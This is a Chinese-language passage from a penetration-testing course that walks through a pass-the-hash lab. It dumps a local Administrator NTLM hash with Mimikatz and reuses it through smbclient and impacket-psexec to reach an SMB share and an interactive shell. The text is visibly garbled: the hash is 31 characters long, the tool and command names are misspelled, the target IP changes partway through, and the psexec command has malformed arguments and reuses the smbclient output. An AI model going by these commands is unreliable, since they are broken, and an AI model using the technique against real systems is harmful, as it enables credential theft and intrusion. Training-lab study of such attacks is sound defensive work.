
# 使用 Kali Linux 进行 OffSec 渗透测试

如果我们不在 pass-hash（哈希值传递）中使用本地 Administrator 用户，目标机器也需要进行特定的配置才能获得成功的代码执行。从 Windows Vista 开始，所有的 Windows 版本都默认启用了 UAC（用户账户控制）。这防止了软件命令在远程系统上以管理员权限运行。这有效地缓解了除本地 Administrator 之外的本地管理员组中用户的此类攻击向量。

在本次演示中，假设我们已经获取了 FILES01 的访问权限以及用户 `gunther` 的密码（`password123!`）。我们想要提取 Administrator 的 NTLM 哈希，并使用它来验证访问 FILES02。我们的目标是访问受限的 SMB 共享，并利用 pass-hash 在 FILES02 上获取一个交互式 shell。

我们假设两台机器（FILES01 和 FILES02）上的本地管理员账户具有相同的密码。这在现实评估中非常常见且经常遇到。

首先使用 RDP 连接到 FILES01 (`192.168.50.211`)，用户名为 `gunther`，密码为 `password123!`。随后我们将启动 Windows 资源管理器，并在地址栏输入 SMB 共享路径 `\\192.168.50.212\secrets`。输入命令后，系统提示输入连接共享所需的凭据。

![](img/987dc9f6ebd8893c565a1d124d7724e6_415_0.png)

图 220：RDP 连接

当我们输入 `gunther` 用户的凭据时，系统提示 Windows 无法访问此共享。这意味着该用户账户在 FILES02 上不存在，或者没有访问该共享所需的权限。

现在，让我们像上一节那样，使用 Mimikatz 获取 Administrator 的 NTLM 哈希。同样，Mimikatz 位于 FILES01 的 `C:\tools`。我们将以管理员身份打开 PowerShell 窗口并启动 Mimikatz。接下来，输入命令 `privilege::debug, token::elevate, lsdump::sam` 从 SAM 中检索存储的 NTLM 哈希。

```
mimikatz # privilege::debug

Privilege '20' OK

mimikatz # token::elevate

...

mimikatz # lsdump::sam

RID : 000001F4 (500)

User : Administrator

Hash NTLM: 7a38310ea6f0027ee955abed17296b4
```

列表 296 - 启用 SeDebugPrivilege，检索 SYSTEM 用户权限并提取 NTLM 哈希

列表 296 显示了 NTLM 提取的输出。我们稍后会看到 Administrator 的 NTLM 哈希。

为了利用 pass-hash (PTH)，我们需要支持使用 NTLM 哈希进行认证的工具。幸运的是，我们有很多选择。让我们回顾几个用例的示例。对于 SMB 遍历和管理，我们使用 `smbclient` 或 `CrackMapExec`。对于命令执行，我们使用 `imppacket` 库中的脚本，如 `psexec.py` 和 `wmiex.py`。我们不仅可以使用 NTLM 哈希通过 SMB 连接目标，如果用户拥有所需的权限，还可以通过 RDP 和 WinRM 等协议连接。我们也可以使用 Mimikatz 进行 pass-hash。

由于本次演示的第一个目标是通过提供 NTLM 哈希来访问 SMB 服务器，我们使用 `smbclient`。

要使用该命令，在这种情况下我们将转义反斜杠将哈希路径作为第一个参数：`\\192.168.59.212\\`。我们将使用 `-U Administrator` 设置用户，并使用 `--pw-nt-hash` 指定哈希。

```
kali@kali~$ smclient \\192.168.59.212\\$ -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed17296b4

Try "Help" to get a list of possible commands.

smb: \dir

secrets.txt

D       Jun 2 16:55:37 2022

DHS     Jun 2 16:55:35 2022

A       Jun 2 11:34:47 2022
```

列表 297 - 使用 NTLM 哈希使用 `smclient`

我们通过提供 NTLM 哈希而非密码成功连接到 SMB。目录列表显示了 `secrets.txt`。下载文件后，我们可以查看其内容。

在演示的第一部分，我们使用 NTLM 哈希访问了 SMB 共享。在第二部分，我们的目标是获取一个交互式 shell。同样，我们有许多不同的工具和脚本可用。我们将使用来自 `impacket` 库的 `psexec` 脚本。该脚本与原始的 Sysinternals 命令非常相似。对于可写共享，它会上传一个执行文件，然后将其注册为 Windows 服务并启动。预期的结果是获取交互式 shell。

要执行 `psexec`，我们使用带有两个参数的 `impacket-psexec`。第一个参数是哈希格式 `"LM:"`，我们在冒号后指定 Administrator 的 NTLM 哈希。由于我们只使用 NTLM 哈希，可以用 32 个零填充 LM。第二个参数是目标格式 `"username@host"`。由于我们只使用 NTLM 哈希，我们可以将其他部分留空，这将为我们提供一个交互式 shell。

```
kali@kali~$ impacket-psexec \\192.168.59.212\\$ -U Administrator --hashes LM:00000000000000000000000000000000:7a38310ea6f0027ee955abed17296b4
```

Try "Help" to get a list of possible commands.

smb: \dir

secrets.txt

D       Jun 2 16:55:37 2022

DHS     Jun 2 16:55:35 2022

A       Jun 2 11:34:47 2022
